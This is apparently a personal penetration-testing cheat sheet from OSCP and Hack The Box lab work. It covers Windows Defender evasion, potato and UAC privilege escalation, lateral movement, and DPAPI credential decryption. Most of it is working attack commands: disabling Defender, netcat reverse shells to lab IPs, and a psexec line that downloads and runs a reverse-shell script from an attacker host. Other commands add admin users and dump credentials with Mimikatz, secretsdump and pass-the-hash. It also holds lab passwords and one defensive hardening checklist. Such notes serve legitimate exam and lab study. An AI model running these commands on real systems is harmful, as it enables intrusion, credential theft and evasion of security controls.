PS C:\Program Files\Windows Defender> MpCmdRun.exe -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true   # Alt Antivirus evasion
PS C:\Program Files\Windows Defender> cd ../../                                                                            # Alt Antivirus evasion 
PS C:\Program Files\Windows Defender> (New-Object Net.Webclient).downloadfile('http://172.16.139.77/PsExec64.exe','C:\PsExec64.exe')     # # Alt Antivirus evasion - Need to specify the entire OP path for PsExec to laucn 

              TBC    # Alt Antivirus evasion - Launc ha Shell on the DC
```

Try and disable Windows Defender
```
C:> sc stop windefend                                         # stop defender - Might need to be admin
P:> Set-MpPreference -DisableRealtimeMonitoring $true         # stop defender - Might need to be admin
CP:> reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f     # Modify Registry to stop defender - often requires a reboot and may be blocked by system policies or Tamper Protection.
```


# Windows Short Keys

```
Windows Key + R       # Get the Run Dialog box to run thnkglike powershell

Shift + right click   # opens an icon with more options , such as "run with a different user" 
```



# Windows Privesc

## Windows Kernel Privesc 


The below has been scripted into the alias wxp='bash /home/kali/OSCP/OSCP-COURSE-Notes/OSCP-Obsidian-Vault/TOOLS/Linux-Tools/WindowsExploitSuggesterScript.sh'    # Windows Exploit Suggester : Privesc
https://github.com/bitsadmin/wesng 

```
K:> pyvenv                                                                          # Windows Exploit Suggester : Privesc - Create and enter into a python virtual Env
K:> pip install wesng termcolor                                                     # Windows Exploit Suggester : Privesc - Install WES
K:> wes --update                                                                    # Windows Exploit Suggester : Privesc - Update the vuln data bases spreadsheet
K:> wes --update-wes                                                                # Windows Exploit Suggester : Privesc - Update Wes becasue you never know
C:> systeminfo > systeminfo.txt                                                     # Windows Exploit Suggester : Privesc - Get a copy of system info fom the target machine 
C:> wmic qfe get Caption,Description,HotFixID,InstalledOn > qfe.txt                 # Windows Exploit Suggester : Privesc - Get a full list of installed Windows updates from the target machine

O:> Uses MS's online catalog to check which vulnerabilities are already covered by newer cumulative updates, even if older KBs are missingmight avoid wasting time chasing already-patched CVEs. 
O:> Caution though, in rare cases this could be a blind spot if there has been a regression, but rare                                           # Windows Exploit Suggester : Privesc
K:> wes --muc-lookup systeminfo.txt
K:> wes --qfe qfe.txt                                                                                                                            # Windows Exploit Suggester : Privesc - Look up the OS version from here: https://learn.microsoft.com/en-us/windows/release-health/release-information then select fro mthe options 
K:> wes --qfe qfe.txt --os "<Correct OS Version from the prompt>" --exploits-only --hide "Internet Explorer" Edge Flash --usekbdate --muc-lookup --output WES_NG-results.txt       # Windows Exploit Suggester : Privesc - Replace with below with  the correct Version number 
K:> wes --qfe qfe.txt --os 40 --exploits-only --hide "Internet Explorer" Edge Flash --usekbdate --muc-lookup --output WES_NG-results.txt         # Windows Exploit Suggester : Privesc - Alt: Show vulns which have public availble exploits 
K:> wes --qfe qfe.txt --os 40 --hide "Internet Explorer" Edge Flash --usekbdate --muc-lookup --output WES_Vulnsreport.txt                        # Windows Exploit Suggester : Privesc - Alt: Show vulsn which dont yet have public exploits 
```

## Potatoes

When we get the shell on a windows machine, the first thing we run is situa ( "Rogue" potato - older and harder,  )
 - https://jlajara.gitlab.io/Potatoes_Windows_Privesc  ??? 
 - https://github.com/decoder-it/LocalPotato main potato creator and news publisher
 - His blog : https://decoder.cloud/
 - Release 2024: https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip

- Rotten Potato
  - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
  - https://www.youtube.com/watch?v=8Wjs__mWOKI
- Lonley Potato
- Juicy Potato
- Rogue POtato
- Local Pptato
- Hot Potato
- Sweet Pptato
- Generic Potato

- **God Potato** - _"Hotfixes can be researched to establish when the system was last updated which is useful for hunting public exploits. What I really want however is the .NET version because we are going to pursue escalation via SeImpersonatePrivilege using a newer potato attack called GodPotato"_. - https://github.com/BeichenDream/GodPotato/releases?source=post_page-----5c69bf508e5d--------------------------------
  - `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"    # Get the .NET version for possible God POtatio Privilege escation on Windows `

```

GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators eric.wallows /add"                                # Windows Privesc - ADD a user to the administrators group 
./GodPotato-NET4.exe -cmd "C:\Windows\Tasks\nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.144.147 8888"      # Windows Privesc - Get nc64 to put a cmd shell back to our listener. Sometimes full paths help 



./GodPotato-NET4.exe -cmd "cmd /c C:\xampp\htdocs\cms\media\shell5.exe"                                         # Windows Privesc - Running God potato often needs the full path of the binary to be executed
./GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.179.211 443"                      # Windows Privesc - Currnent fav way of useing this - OSCP B Gust had a restirction on char length so renamed to to GP.exe 

GodPotato-NET4.exe -cmd "nc.exe 192.168.179.156 4444 -e cmd.exe"                                                # Windows Privesc - Keep it simple - Offsec PG Jacko
GodPotato-NET4.exe -cmd "C:\Windows\Tasks\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.199 4444"       # Windows Privesc - Keep it simple - Offsec PG Jacko
```


```
./SweetPotato.exe -e efsrpc -p '\windows\tasks\shell.exe`                                                       # Windows Privesc  - Sweet Potato - Sharp Collection . often works - offsec Hutch
```

Juicy Potato 
https://github.com/ivanitlearning/Juicy-Potato-x86/releases - As per Offsec Authby

```
Juicy.Potato.x86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c C:\wamp\nc.exe -e cmd.exe 192.168.179.176 4444" -t *    # Windows Privesc  - Juicy Potato - Sharp Collection . often works - offsec Authby
```

```
CP:> reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP\v4" /s                # Windows privesc - Check which .NET version for potatoe attacks
```
```
net user bossman Dork123! /add                          # Add a new user on windows - named bossman; password of Dork123!  
net localgroup Administrators bossman /add              # Add a new user on windows - add to admins 
net localgroup 'Remote Desktop Users' bossman /add      # Add a new user on windows - add to rdp access

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlsSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f   # Enable rdp on a windows machineif 
```

```
C:> ./PsExec64.exe -s -i \\FILES02 -u medtech.com\joe -p Flowers1 cmd         # Windows privesc - psexec example from Medtech
```


Sharp collection is a set of nightly builds of windows offensive tools - https://github.com/Flangvik/SharpCollection    # # Windows privesc - SHARP COLLECTION! 

See notes in win.md on - **Juciy Potato (x86 When Godpotato and PrintSpoofer dont work SeImpersonate)**

### Privlege escalation tools FullPowers.exe and PrintSpoofer.exe 
https://github.com/itm4n/FullPowers?tab=readme-ov-file
https://github.com/itm4n/PrintSpoofer

###### Windpows Privesc with named pipes and SeImpersonatePrivilege
SeImpersonatePrivilege in the context of named pipes to escalate privs. Named pipes allow two unrelated process the ability to transfer data betwee neach other. This can be abused for privesc.
If we can create a nasty named pipe AND get an elevated process ot connect to it with SeImpersonatePrivilege assigned, we could elevate our privs via the connecting account. Printspoofer and Potatoes are some examples of this (TODO - Understand this at a much deeper leve) 

`LOCAL SERVICE` or `NETWORK SERVICE` are configured to run with a restricted set of privileges, FullPowers.exe assists somewhat with Windows privesc

```
C:> FullPowers.exe -c "powershell -ep Bypass"                   # Windows privesc - Retunrs starting set of privileges
C:> PrintSpoofer.exe -i -c powershell.exe -c bypass             # Windows privesc - if seImpersonate creates a SYSTME process on the Spooler (needs to be enabled) - https://github.com/itm4n/PrintSpoofer
C:> PrintSpoofer64.exe -i -c c:\Windows\Tasks\shell64.exe       # Windows privesc -  Godpotato DID NOT WORK to return  a shell maybe Printspoofer will
```



##### # Windows Privesc - If we are on the host User Bob has active session , we can get a rev shell, becasue his security context is live

```sh 
psexec -u Bob -p BobPassword -s cmd.exe /c "powershell -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker_ip/reverse_shell.ps1')"  # Windows Privesc
```
#### runas - run a shell as a victim 
If we have credentials as of another user on the host , we can try to do a RunAs. With the below comand we will be promted for credentials and the na cmd prompt will open ( if we have GUI access). We could run PS, reve shell?

```
runas /user:VICTIM cmd                  # Windows Privesc - if yo uhave aq GUI () and mayb juts a terminal ) laucnh a remote chell as a compromised user to another machione
runas /user:USER­NAME “C:\full\path\of\Program.exe”   # Windows Privesc - provide creds on promt 
runas /user:corp\jen powershell.exe     # Windows Privesc - AD priv esc to launch powershll as the user Jen whose password we just changed. She is a domain admin 
```
UAC bypass for Windows 
```
PS:> Invoke-EventViewer.ps1                                    # Windows Privesc via UAC bypass - Get invokeviewer
PS:> Import-Module Invoke-EventViewer.ps1                      # Windows Privesc via UAC bypass - Import the module 
PS:> Invoke-EventViewer.ps1 powershell.exe                     # Windows Privesc via UAC bypass - Run your command of choice
# Might require a GUI so will need rdp enabled                 # Windows Privesc via UAC bypass
```


```
akagi.exe                                                       # Windows Privesc via UAC bypass - akagi is the UACME bypass tool. Look up notes
```


### Bypass UAC with Fodhelper

These commands are used to set up a UAC bypass via the "fodhelper.exe" or similar auto-elevated binaries exploiting the ms-settings protocol handler. 
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd"
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
`cmd` will likly be casught by AV but there is a way to get a powershell command to run the reverse shell every tiem `fodhelper` is run


### Replace a binary with arev shell and then restart teh service
```
PS> sc.exe start auditTracker                   # Windows Privesc - starts our vuln service and returns a shell from our msfvenom payload autidTracker.exe - winpeas scan on OSCPO MedTech
```


#### Windows Privesc checking runing processes for elevated users
If we have a GUI or rdp access we can use procexp64.exe to enumerate running process. It can be found:  
/home/kali/Tools/AD-Attacking-Tools/PSTools/procexp64.exe 

### EvilMog Windows Checklist (I think) 
1. Read into the Microsoft Securing Privileged Access Whitepaper
https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access
2. Review the malware archaeology logging cheatsheets which include the ATT&CK lateral movement guide, windows and powershell sheets
https://www.malwarearchaeology.com/cheat-sheets/
3. review all posts on adsecurity.org
http://adsecurity.org/
4. learn to use bloodhound defensively, collectionmethod All includes ACL abuses, run monthly
https://posts.specterops.io/tagged/bloodhound?gi=3270315c3d6a
5. Disable LLMNR (link local multicast name resolution)
6. Disable WPAD (Windows Proxy Auto Discovery)
7. Disable NBT-NS (NetBIOS Name Services). the following powershell will do it, push via GPO
`$NetworkAdapters = (get-wmiobject win32_networkadapterconfiguration) ForEach ($NetworkAdapterItem in $NetworkAdapters) { $NetworkAdapterItem.SetTCPIPNetbios(2) }`
8. Enforce SMB Signing and disable SMBv1
9. Disable Powershell 2, enable powershell v5, deploy poweshell transcription block logging, module logging and script block logging
10. use microsoft ata (advanced threat analytics)
11. deploy PAW (privileged access workstations)
12. deploy red forest with full tier 0/1/2 isolation and Microsoft Privilege Identity Manager with dynamic privilege assignment
13. deploy local admin password solution (LAPS)-ensure all local admin passwords are different between workstations, servers and VDI's. Also remove universal local admin accounts.
14. remove local admin from users, ensure PAW's have no admin on that workstation for individual machine admins
15. deploy credential guard
16. deploy device guard
17. deploy exploit guard
18. deploy sysmon
19. deploy applocker
20. employ windows firewall blocking inbound 135-139, 389, 636 3389,445, 5985/5986 unless authentication through a VPN from managed workstations, also block these ports on internal and xternal network firewalls
21. make sure nac and va scanners don't spray creds
22. look at mimikatz protection such as rdp restricted admin mode http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png
23. secure dynamic dns updates
24. purge group policy preferences files and unattended installation files
25. change the krbtgt hash twice a year
26. ensure there are no paths from kerberoastable users to high value targets such as domain admin
27. plant honey tokens and accounts to detect anomalous activity especially against kerberoasting with an SPN set
28. enforce LDAP signing and LDAP channel binding
29. mitigate a nasty exchange bug, details are here: https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ 
    1.  There is a mitigations section, follow it completely including removing the excessive permissions
30. remove print spooler from domain controllers or sensitive servers, you can force the machines to authenticate and relay
31. follow mitigations here: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
32. Deploy Windows 10, Server 2016
33. Use the Microsoft SECCON Frameworkhttps://docs.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-configuration-framework
34. Disable all Lanman responses in NTLM Challenges and NTLMv1 challenge response on clients and servers.

### Windows Lateral movement

```
### Windows Lateral Movement

# 0. Miscellaneous Commands  - Windows lateral movement
CP:> net user hacker Tuesday@2                                                                                             # Windows lateral movement - Change hacker user password
CP:> net user hacker Tuesday@2 /add /domain                                                                                # Windows lateral movement - Add hacker to domain    (Note: guest user can be unreliable)
CP:> net localgroup administrators hacker /add                                                                                # Windows lateral movement - Add hacker to local administrators (Note: guest user can be unreliable)
CP:> net localgroup "Remote Desktop Users" hacker /add                                                                        # Windows lateral movement - Add hacker to RDP group (Note: guest user can be unreliable)

# 1. Credential Harvesting  - Windows lateral movement
P:> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'                                                                   # Windows lateral movement - Dump credentials from memory
P:> Invoke-Mimikatz -Command '"kerberos::ticket /export"'                                                                   # Windows lateral movement - Extract Kerberos tickets for Pass-the-Ticket attacks
P:> Get-DomainUser -PreauthNotRequired | select name                                                                        # Windows lateral movement - Enumerate accounts vulnerable to AS-REP Roasting

# 2. Kerberoasting  - Windows lateral movement
P:> Get-DomainUser -SPN | select name, serviceprincipalname                                                                 # Windows lateral movement - Find service accounts for Kerberoasting
CP:> GetUserSPNs.py -request -dc-ip <DC_IP> domain/user:password                                                            # Windows lateral movement - Impacket - Request Kerberos tickets for SPNs

# 3. Pass-the-Hash  - Windows lateral movement
CP:> pth-winexe -U 'user%NTLM_HASH' //target cmd                                                                            # Windows lateral movement - Authenticate using NTLM hash
mimikatz # sekurlsa::pth /user:administrator /domain:secura.yzx /ntlm:a51493b0b06e5e35f855245e71af1d14 /run:shell.exe       # Windows lateral movement - Run a shell with Pass-the-Hash

# 4. Remote Command Execution  - Windows lateral movement
P:> Invoke-Command -ComputerName <hostname> -ScriptBlock {<command>}                                                        # Windows lateral movement - PowerShell Remoting
CP:> wmiexec.py domain/user:password@target_ip                                                                              # Windows lateral movement - Execute commands via WMI (Impacket)
CP:> smbexec.py domain/user:password@target_ip                                                                              # Windows lateral movement - Execute commands via SMB (Impacket)
CP:> psexec.py domain/user:password@target_ip                                                                               # Windows lateral movement - Execute commands remotely as SYSTEM

# 5. Network Share Enumeration  - Windows lateral movement
P:> Get-NetShare                                                                                                            # Windows lateral movement - Enumerate shares on local machine
P:> Find-DomainShare                                                                                                        # Windows lateral movement - Enumerate shares in the domain
CP:> net use "\\10.0.0.129\C$" /user:hacker Passw0rd!                                                                        # Windows lateral movement - Access a share on another machine
CP:> smbclient -L //<target> -U <user>%<password>                                                                           # Windows lateral movement - Linux SMB enumeration
C:> ls \\<target>\<share>                                                                                                   # Windows lateral movement - Browse remote shares

# 6. Domain Enumeration  - Windows lateral movement
P:> Get-Domain                                                                                                              # Windows lateral movement - Get domain information
P:> Get-DomainController                                                                                                    # Windows lateral movement - List domain controllers
P:> Get-DomainPolicy | select -ExpandProperty systemaccess                                                                  # Windows lateral movement - Get domain password policy
CP:> net group "Domain Admins" /domain                                                                                       # Windows lateral movement - List members of Domain Admins

# 7. Privilege Escalation Enumeration  - Windows lateral movement
P:> Get-ObjectAcl -Identity <object_name> | select ActiveDirectoryRights                                                    # Windows lateral movement - Find misconfigured ACLs
P:> Find-InterestingDomainAcl                                                                                               # Windows lateral movement - Identify privilege escalation paths
P:> Get-DomainObjectAcl -ResolveGUIDs                                                                                       # Windows lateral movement - Enumerate ACLs for domain objects

# 8. Session Enumeration  - Windows lateral movement
P:> Get-NetLoggedon                                                                                                         # Windows lateral movement - Find users logged onto local machine
P:> Get-NetSession                                                                                                          # Windows lateral movement - Enumerate sessions on local/remote machines
C:> quser /server:<target>                                                                                                  # Windows lateral movement - List logged-on users on a target machine

# 9. Forest and Trust Enumeration  - Windows lateral movement
P:> Get-NetForest                                                                                                           # Windows lateral movement - Retrieve forest information
P:> Get-NetDomainTrust                                                                                                      # Windows lateral movement - Enumerate domain trust relationships
P:> Get-DomainTrustMapping                                                                                                  # Windows lateral movement - Visualize trust relationships in the domain

# 10. Service Enumeration and Exploitation  - Windows lateral movement
P:> Get-Service | Where-Object {$_.StartName -ne "NT AUTHORITY\System"}                                                     # Windows lateral movement - Find services not running as SYSTEM
C:> sc qc <service_name>                                                                                                    # Windows lateral movement - Check service configuration
P:> Invoke-Command -ScriptBlock {Restart-Service -Name <service>} -ComputerName <target>                                    # Windows lateral movement - Restart service remotely
CP:> setspn.exe -Q */*                                                                                                       # Windows lateral movement - Native tool to get all the SPNs SPN's SPN

# 11. Enabling Remote Desktop  - Windows lateral movement
C:> powershell -ep bypass                                                                                                   # Windows lateral movement - Enable PowerShell execution
P:> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0     # Windows lateral movement - Enable RDP (PS)
C:> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f              # Windows lateral movement - Enable RDP  (C)
P:> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"                                                                   # Windows lateral movement - Enable RDP through firewall
P:> Set-Service -Name "TermService" -StartupType Automatic                                                                  # Windows lateral movement - Set RDP service to auto-start
P:> Start-Service -Name "TermService"                                                                                       # Windows lateral movement - Start RDP service
 
# 11. Enabling Remote Desktop - Windows lateral movement (Allow any user)
C:> powershell -ep bypass                                                                                                   # Windows lateral movement - Enable PowerShell execution
P:> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0     # Windows lateral movement - Enable RDP
P:> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"                                                                   # Windows lateral movement - Enable RDP through firewall
P:> New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow             # Windows lateral movement - Explicitly allow RDP on port 3389
CP:> net localgroup "Remote Desktop Users" hacker /add                                                                       # Windows lateral movement - Add hacker to RDP group
P:> Set-Service -Name "TermService" -StartupType Automatic                                                                  # Windows lateral movement - Set RDP service to auto-start
P:> Start-Service -Name "TermService"                                                                                       # Windows lateral movement - Start RDP service


# 12. NTDS Extraction and Offline Hash Cracking  - Windows lateral movement
CP:> secretsdump.py -just-dc-ntlm -outputfile <output> domain/user:password@DC                                              # Windows lateral movement - Extract NTDS hashes (Impacket)
CP:> hashcat -m 1000 -a 0 <hash_file> <wordlist>                                                                            # Windows lateral movement - Crack NTLM hashes with hashcat

# 13. Port Forwarding and Tunneling  - Windows lateral movement
CP:> plink.exe -ssh -L 3389:<target_ip>:3389 user@jumpbox_ip                                                                # Windows lateral movement - Local port forwarding via SSH
CP:> chisel server -p <port> --reverse                                                                                      # Windows lateral movement - Chisel for tunneling (server)
CP:> chisel client <attacker_ip>:<port> R:<local_port>:<remote_host>:<remote_port>                                          # Windows lateral movement - Chisel for tunneling (client)

# 14. WinRM Configuration  - Windows lateral movement
P:> winrm quickconfig                                                                                                       # Windows lateral movement - Enable WinRM
P:> Enter-PSSession -ComputerName <DC-IP> -Credential <domain>\administrator                                                # Windows lateral movement - Run a WinRM session
CP:> .\PsExec64.exe \\192.168.179.97 -u secura.yzx\administrator -p Reality2Show4!.? cmd                                    # Windows lateral movement - Launch a cmd promt on another machine
CP:> .\PsExec64.exe \\192.168.179.97 -u secura.yzx\administrator -p Reality2Show4!.? powershell.exe                         # Windows lateral movement - Launch a powershell promt on another machine
C:> ./PsExec64.exe -s -i \\FILES02 -u medtech.com\joe -p Flowers1 cmd                                                       # Windows lateral movement - psexec example from Medtech

```

PS C:\Users\Administrator\Desktop> Enter-PSSession -ComputerName MACHINENAME -Credential (Get-Credential)                   # Windows lateral movement - Poweshell remote session if enabled. Creds required in popoup

```
P:> [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-Content -Path "INPUTFILENAME" -Raw))) | Set-Content -Path "OUTB64.txt"   # Windows lateral movement - convert a file to base64 when you cannot export
P:> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx"))                              # Windows lateral movement - convert a file to base64 when you cannot export . Take the blob and paste it in to a file back on host
```


```
# 1. Check RDP Status ----------------------------- Rdp Troubleshooting
CP:> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections                               # Rdp Troubleshooting - Check RDP enabled
CP:> net localgroup "Remote Desktop Users"                                                                                 # Rdp Troubleshooting - Check RDP users
CP:> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections                               # Rdp Troubleshooting - Check RDP status
CP:> netstat -ano | findstr :3389                                                                                          # Rdp Troubleshooting - Check RDP port

# 2. Enable RDP --------------- Rdp Troubleshooting
P:> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0    # Rdp Troubleshooting - Enable RDP
P:> Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 2              # Rdp Troubleshooting -        (opt) allow users with valid credentials who are not anonymous to login with hashes 
P:> Enable-NetFirewallRule -DisplayGroup "Remote Desktop"                                                                  # Rdp Troubleshooting - Allow RDP through firewall
P:> New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow            # Rdp Troubleshooting - Explicitly allow RDP port

# 3. Add User to RDP Group --------------- Rdp Troubleshooting
CP:> net localgroup "Remote Desktop Users" hacker /add                                                                      # Rdp Troubleshooting - Add user to RDP group  (Note: guest user can be unreliable)
CP:> net localgroup "Remote Desktop Users"                                                                                  # Rdp Troubleshooting - Verify RDP group members

# 4. Start RDP Service --------------- Rdp Troubleshooting
P:> Set-Service -Name "TermService" -StartupType Automatic                                                                 # Rdp Troubleshooting - Set RDP service auto-start
P:> Start-Service -Name "TermService"                                                                                      # Rdp Troubleshooting - Start RDP service
C:> sc qc TermService                                                                                                      # Rdp Troubleshooting - Verify service config
C:> sc query TermService                                                                                                   # Rdp Troubleshooting - Check service status

# 5. Troubleshoot Registry and Firewall --------------- Rdp Troubleshooting
CP:> reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"                                 # Rdp Troubleshooting - Check RDP registry keys
CP:> reg query "HKLM\SYSTEM\CurrentControlSet\Services\TermService"                                                        # Rdp Troubleshooting - Verify RDP service registry
CP:> netsh advfirewall firewall show rule name="Remote Desktop"                                                            # Rdp Troubleshooting - Check RDP firewall rules

# 6. Verify NLA and Listener --------------- Rdp Troubleshooting
P:> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name UserAuthentication # Rdp Troubleshooting - Check NLA setting
CP:> netstat -ano | findstr :3389                                                                                          # Rdp Troubleshooting - Verify RDP listener on port 3389
P:> Restart-Service -Name "TermService"                                                                                    # Rdp Troubleshooting - Restart RDP service

# 7. Check Subnet and Connectivity --------------- Rdp Troubleshooting
C:> tracert <target_ip>                                                                                                    # Rdp Troubleshooting - Trace route to machine
C:> ping <target_ip>                                                                                                       # Rdp Troubleshooting - Verify basic connectivity
CP:> Test-NetConnection -ComputerName <target_ip> -Port 3389                                                               # Rdp Troubleshooting - Test connection to RDP port

```



## DPAPI ( Data Protection API) 

Also see - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#overview

DPAP is ( appaerently ) one of microsofts recommended way to store credentials for automation purposes, lets try to decrypt them. 
This tool will dump the stored credentaisl ( HTB Vintage) - https://github.com/peewpw/Invoke-WCMDump

```
.\Invoke-WCMDump.ps1          #dump Windows Stored credentials includieng DPAPI
```


```sh
*Evil-WinRM* PS C:\Documents> type automation.txt
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
```
First save the string in a new file called cred.txt (without the first line), then 

```powershell
PS:> $pw = Get-Content creds.txt | ConvertTo-SecureString                                                                 # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
PS:> $bstr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pw)                                            # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
PS:> $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)                                 # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
PS:> $UnsecurePassword                                                                                                    # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
                                                                                                                          # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
PS:> hHO_S9gff7ehXw                                                                                                       # Windows DPAPI - Credntials hash is a recomended way t ostore creds for automation
```
#### DPAPI Common Locations 
```
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\      # DPAPI master keys:
C:\Users\<user>\AppData\Local\Microsoft\Credentials\          # DPAPI credentials:
```


## DPAPI cracking

Convert a credential DPAPI from `C:\Users\C.Neri\AppData\roaming\Microsoft\credentials ` into a 64 blob  for transfer
```ps
PS:> [Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\C4BB96844A5C9DD45D5B6A9859252BA6"))
```

(Or do the same in kali)
```sh
cat C4BB96844A5C9DD45D5B6A9859252BA6 | base64 -w 0 > credBlob.b64
```

We will also need the master key from the protect folder 
- `C:\Users\C.Neri\Appdata\roaming\microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115`

One of the below will the domain key and one the user. One will be needed to decrypt `credBlob.b64`

```powershell
*Evil-WinRM* PS C:\Users\C.Neri\Appdata\roaming\microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> gci -force

    Directory: C:\Users\C.Neri\Appdata\roaming\microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

Convert these two keys to b64
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))
```

Copy them over and then DE-encode from base64  locally to  `dpapiblob1` and `dpapiblob2` like:

```bash
cat credBlob.b64 | base64 -d Credblob_D
```
#### pypykatz cracking Prep

Pypykatz == Mimikatz in pure Python.[wiki](https://github.com/skelsec/pypykatz/wiki)

We will need the SID of our user
TA: What is pypy katz?!!
First step is to create the `prekey`  which allows `master key` unlock
```
pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' | tee pkf
```

```
pypykatz dpapi msterkey dpapiblob1 pkf -o mkf1
```

```
pypykatz dpapi msterkey dpapiblob2 pkf -o mkf2
```

```
cat dpapiblob1 | base64 -d mkf1
```

```
cat dpapiblob2 | base64 -d mkf2
```

```
pypykatz lsa minidump lsass.DMP | tee MimiDump_Report   # Use s pypykatx to recover dump files like lsass.dmp from a systme crash ( HTB Blackfeild)
```

#### pypykatz Cracking 
we can then use the key to decrypt

```
pypykatz dpapi credential mkf Credblob_D 
```

The tidier approach is to comibine the two keys key data into 1 master key section
```
{
    "backupkeys": {},
    "masterkeys": {
        "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847": "55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f","99cf41a3-a552-4cf7-a8d7-aca2d6f7339b": "f8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a"
    }
}
```

We can then use the combined key ( of 1 by 1 ) to decrypt

```
pypykatz dpapi credential mkf Credblob_D 
```

eg Output

```
└─$ pypykatz dpapi credential mkf Credblob_D  
type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : b'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00'
```
The above password is in UTF16-le but is `Uncr4ck4bl3P4ssW0rd0312` 

------


#### LAPS 
LapsToolkit - https://github.com/leoloobeek/LAPSToolkit
```
Find-LAPSDelegatedGroups              # LAPS tool kit - 
Find-AdmPwdExtendedRights             # LAPS tool kit - checks rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." 
Get-LAPSComputers                     # LAPS tool kit - search for computers that have LAPS enabled when passwords expire, and see passwords in cleartext if our user has access.
```


#### VNC
IF you find a vnc with hardcoded DES credentials you can decrypt the password wit hthis 1 liner
```
